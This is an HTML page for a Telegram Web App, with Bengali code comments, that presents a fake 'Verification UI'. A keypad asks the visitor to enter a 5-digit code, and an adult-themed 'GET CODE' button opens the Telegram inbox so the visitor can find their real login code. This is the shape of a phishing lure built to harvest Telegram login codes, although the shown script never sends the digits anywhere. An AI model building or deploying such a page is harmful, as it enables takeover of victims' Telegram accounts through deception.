<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification UI</title>
    <!-- টেলিগ্রামের অফিসিয়াল স্ক্রিপ্ট -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1a1a1a; 
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            overflow: hidden;
        }

        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 35px 25px;
            border-radius: 40px;
            text-align: center;
            width: 320px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
        }

        .top-icon {
            background: white;
            width: 60px;
            height: 40px;
            border-radius: 12px;
            margin: -65px auto 20px auto;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .top-icon span { font-size: 24px; }

        p { font-size: 14px; margin-bottom: 25px; opacity: 0.9; }

        .otp-inputs {
            display: flex;
            justify-content: space-between;
            margin-bottom: 25px;
        }

        .otp-inputs input {
            width: 45px;
            height: 55px;
            background: rgba(255, 255, 255, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 12px;
            text-align: center;
            font-size: 22px;
            color: white;
            outline: none;
        }

        .get-code-btn {
            background: linear-gradient(90deg, #ff0055, #ff0077);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 50px;
            color: white;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-bottom: 25px;
            transition: 0.3s;
        }

        .get-code-btn:active { transform: scale(0.95); }

        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
        }

        .key {
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 12px;
            font-size: 20px;
            font-weight: 500;
            cursor: pointer;
            user-select: none;
        }

        .key:active { background: rgba(255, 255, 255, 0.3); }

        .key.empty { background: transparent; cursor: default; }
    </style>
</head>
<body>

    <div class="card">
        <div class="top-icon">
            <span>📂</span>
        </div>
        
        <p>Enter the 5-digit code that we just sent you!</p>

        <div class="otp-inputs" id="otp-container">
            <input type="text" maxlength="1" readonly>
            <input type="text" maxlength="1" readonly>
            <input type="text" maxlength="1" readonly>
            <input type="text" maxlength="1" readonly>
            <input type="text" maxlength="1" readonly>
        </div>

        <button class="get-code-btn" onclick="goToInbox()">🔞 GET CODE 🔞</button>

        <div class="keypad">
            <div class="key" onclick="pressKey('1')">1</div>
            <div class="key" onclick="pressKey('2')">2</div>
            <div class="key" onclick="pressKey('3')">3</div>
            <div class="key" onclick="pressKey('4')">4</div>
            <div class="key" onclick="pressKey('5')">5</div>
            <div class="key" onclick="pressKey('6')">6</div>
            <div class="key" onclick="pressKey('7')">7</div>
            <div class="key" onclick="pressKey('8')">8</div>
            <div class="key" onclick="pressKey('9')">9</div>
            <div class="key empty"></div>
            <div class="key" onclick="pressKey('0')">0</div>
            <div class="key" onclick="pressKey('back')">✉️</div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        const inputs = document.querySelectorAll('#otp-container input');
        let currentIdx = 0;

        function pressKey(key) {
            if (key === 'back') {
                if (currentIdx >= 0) {
                    if (inputs[currentIdx].value === "" && currentIdx > 0) {
                        currentIdx--;
                    }
                    inputs[currentIdx].value = "";
                }
            } else {
                if (currentIdx < inputs.length) {
                    inputs[currentIdx].value = key;
                    if (currentIdx < inputs.length - 1) {
                        currentIdx++;
                    }
                }
            }
        }

        // সঠিক ফাংশন যা চ্যাট ইনবক্সে নিয়ে যাবে
        function goToInbox() {
            // Service Notifications এর জন্য কোনো পাবলিক লিঙ্ক নেই
            // তাই এটি ব্যবহারকারীকে সরাসরি মেসেজ লিস্টে নিয়ে যাবে, 
            // যেখানে সে তার নতুন কোডটি সবার উপরে দেখতে পাবে।
            tg.openTelegramLink("tg://"); 
            
            // অথবা যদি আপনি অ্যাপটি বন্ধ করে সরাসরি ইনবক্স দেখাতে চান:
            // tg.close();
        }
    </script>
</body>
</html>
